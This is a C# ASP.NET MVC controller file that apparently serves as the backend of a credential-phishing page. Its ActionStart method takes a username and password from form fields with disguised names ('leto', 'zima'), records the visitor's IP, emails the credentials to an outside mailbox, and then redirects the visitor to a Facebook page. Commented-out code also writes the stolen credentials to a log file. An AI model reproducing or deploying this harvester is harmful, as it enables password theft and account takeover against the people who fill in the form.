﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.IO;
using System.Net;
using MvcApplication7.Models;
using System.Net.Mail;
    
namespace MvcApplication2.Controllers
{
    public class RequestHelpers
    {
        public static string GetClientIpAddress(HttpRequestBase request)
        {
            try
            {
                var userHostAddress = request.UserHostAddress;

                // Attempt to parse.  If it fails, we catch below and return "0.0.0.0"
                // Could use TryParse instead, but I wanted to catch all exceptions
                IPAddress.Parse(userHostAddress);

                var xForwardedFor = request.ServerVariables["X_FORWARDED_FOR"];

                if (string.IsNullOrEmpty(xForwardedFor))
                    return userHostAddress;

                // Get a list of public ip addresses in the X_FORWARDED_FOR variable
                var publicForwardingIps = xForwardedFor.Split(',').Where(ip => !IsPrivateIpAddress(ip)).ToList();

                // If we found any, return the last one, otherwise return the user host address
                return publicForwardingIps.Any() ? publicForwardingIps.Last() : userHostAddress;
            }
            catch (Exception)
            {
                // Always return all zeroes for any failure (my calling code expects it)
                return "0.0.0.0";
            }
        }

        private static bool IsPrivateIpAddress(string ipAddress)
        {
            // http://en.wikipedia.org/wiki/Private_network
            // Private IP Addresses are: 
            //  24-bit block: 10.0.0.0 through 10.255.255.255
            //  20-bit block: 172.16.0.0 through 172.31.255.255
            //  16-bit block: 192.168.0.0 through 192.168.255.255
            //  Link-local addresses: 169.254.0.0 through 169.254.255.255 (http://en.wikipedia.org/wiki/Link-local_address)

            var ip = IPAddress.Parse(ipAddress);
            var octets = ip.GetAddressBytes();

            var is24BitBlock = octets[0] == 10;
            if (is24BitBlock) return true; // Return to prevent further processing

            var is20BitBlock = octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31;
            if (is20BitBlock) return true; // Return to prevent further processing

            var is16BitBlock = octets[0] == 192 && octets[1] == 168;
            if (is16BitBlock) return true; // Return to prevent further processing

            var isLinkLocalAddress = octets[0] == 169 && octets[1] == 254;
            return isLinkLocalAddress;
        }
    }


    public class HomeController : Controller
    {
        public static string GetIPAddress(HttpRequestBase request)
        {
            string ip;
            try
            {
                ip = request.ServerVariables["HTTP_X_FORWARDED_FOR"];
                if (!string.IsNullOrEmpty(ip))
                {
                    if (ip.IndexOf(",") > 0)
                    {
                        string[] ipRange = ip.Split(',');
                        int le = ipRange.Length - 1;
                        ip = ipRange[le];
                    }
                }
                else
                {
                    ip = request.UserHostAddress;
                }
            }
            catch { ip = null; }

            return ip;
        }

        public ActionResult Index()
        {
            return View();
        }

        public ActionResult ActionStart(UserViewModel model)
            //public ActionResult ActionStart(FormCollection collection)
        {
            string strPath = AppDomain.CurrentDomain.BaseDirectory;
            string strLogFilePath = strPath + @"log\log.txt";
            //string userName = collection.Get("leto");
            //string passwd = collection.Get("zima");
            string ip = GetIPAddress(HttpContext.Request);
            var clientIP = Request.UserHostAddress;
/*
            string path = @"c:\temp\MyTest.txt";
            // This text is added only once to the file.
            if (!System.IO.File.Exists(strLogFilePath))
            {
                // Create a file to write to.
                using (StreamWriter writetext = System.IO.File.CreateText(strLogFilePath))
                {
                    writetext.WriteLine("username:" + model.leto );
                    writetext.WriteLine("passswd: " + model.zima );
                    writetext.WriteLine("ip: " + ip);
                    writetext.WriteLine("client ip: " + clientIP);
                    writetext.WriteLine("date: " + DateTime.Now.ToString());
                    writetext.WriteLine();
                    writetext.Close();
                }
            }

            // This text is always added, making the file longer over time
            // if it is not deleted.
            using (StreamWriter writetext = System.IO.File.AppendText(strLogFilePath))
            {
                writetext.WriteLine("username:" + model.leto);
                writetext.WriteLine("passswd: " + model.zima);
                writetext.WriteLine("ip: " + ip);
                writetext.WriteLine("client ip: " + clientIP);
                writetext.WriteLine("date: " + DateTime.Now.ToString());
                writetext.WriteLine();
                writetext.WriteLine();
                writetext.Close();
            }
            */
            var smtpClient = new SmtpClient();
            smtpClient.Send(new System.Net.Mail.MailMessage("wank@apphb.com", "hrc@centrum.cz")
            {
                Subject = "Wank was used",
                Body = "username:" + model.leto + System.Environment.NewLine + "passswd: " + model.zima + System.Environment.NewLine + "ip: " + ip + System.Environment.NewLine + "client ip: " + clientIP
            });
            
            /*
            if ((model.leto == "log") && (model.zima == "log"))
            {
                return RedirectToAction("Log", "Home");
            }*/
            
            return Redirect(@"https://www.facebook.com/pages/Wank-Horse/649867128361350");
        }
    }
}

